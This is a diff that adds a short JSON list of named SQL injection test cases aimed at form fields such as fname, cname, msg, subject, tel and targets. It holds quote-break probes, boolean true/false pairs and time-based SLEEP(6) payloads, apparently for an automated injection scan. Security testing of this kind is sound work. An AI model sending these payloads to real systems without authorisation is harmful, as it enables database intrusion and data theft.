@@ -1,0 +1,19 @@
+[
+  ["u_BASELINE", {}],
+  ["u_fname_sq", {"fname": "1'"}],
+  ["u_cname_bool_t", {"cname": "1' AND '1'='1"}],
+  ["u_cname_bool_f", {"cname": "1' AND '1'='2"}],
+  ["u_msg_sq", {"msg": "1'"}],
+  ["u_msg_bool_t", {"msg": "1' AND '1'='1"}],
+  ["u_msg_bool_f", {"msg": "1' AND '1'='2"}],
+  ["u_subject_sq", {"subject": "1'"}],
+  ["u_subject_bool_t", {"subject": "1' AND '1'='1"}],
+  ["u_subject_bool_f", {"subject": "1' AND '1'='2"}],
+  ["u_tel_sq", {"tel": "1'"}],
+  ["u_tel_bool_t", {"tel": "1' AND '1'='1"}],
+  ["u_tel_bool_f", {"tel": "1' AND '1'='2"}],
+  ["u_targets_sq", {"targets": "1'"}],
+  ["u_fname_sleep", {"fname": "1' AND SLEEP(6)-- -"}],
+  ["u_msg_sleep", {"msg": "1' AND SLEEP(6)-- -"}],
+  ["u_cname_time", {"cname": "1' AND (SELECT SLEEP(6))-- -"}]
+]
